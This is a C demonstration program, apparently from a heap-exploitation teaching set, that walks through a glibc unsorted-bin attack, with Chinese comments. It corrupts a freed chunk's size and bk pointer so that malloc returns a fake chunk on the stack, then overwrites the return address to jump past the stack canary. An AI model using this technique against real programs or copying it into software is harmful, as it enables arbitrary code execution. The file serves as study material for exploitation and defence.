#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

void jackpot(){ printf("Nice jump d00d\n"); exit(0); }

int main() {
	intptr_t stack_buffer[4] = {0};

	printf("Allocating the victim chunk\n");
	intptr_t* victim = malloc(0x100);

	printf("Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
	//*防止被利用chunk--victim在free时和top chunk合并
	intptr_t* p1 = malloc(0x100);

	printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
	free(victim);

	printf("Create a fake chunk on the stack");
	printf("Set size for next allocation and the bk pointer to any writable address");
	//!符合chunk大小范围，且保证下次分配到此空间(仅需要将此处fake chunk 的 size域改为和下次malloc相匹配的即可)
	//实际空间大小=请求大小 + 2 * SIZE_SZ，此时chunk未在使用，inuse bit为0
	stack_buffer[1] = 0x100 + 0x10;
	//victim -> bk -> bk pointing to stack
	stack_buffer[3] = (intptr_t)stack_buffer;

	//------------VULNERABILITY-----------
	printf("Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
	printf("Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
	//*修改当前在unsorted bin中的chunk的size，保证下次分配直接分配到fake chunk从而实现控制stack上的数据
	//*可选步骤，可通过多次分配chunk来实现不修改victim的size域分配fake chunk
	victim[-1] = 32;
	//!构造fake chunk地址，位于stack中可制造overflow或绕过canary控制返回地址
	//*此处stack_buffer可控制为return_addr - 2 * SIZE_SZ(rbp - SIZE_SZ)的位置
	//*可直接控制return_addr，绕过stack overflow和canary的限制
	victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
	//------------------------------------
	//修改当前函数的返回地址
	printf("Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
	char *p2 = malloc(0x100);
	printf("malloc(0x100): %p\n", p2);

	intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
	memcpy((p2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

	assert((long)__builtin_return_address(0) == (long)jackpot);
}
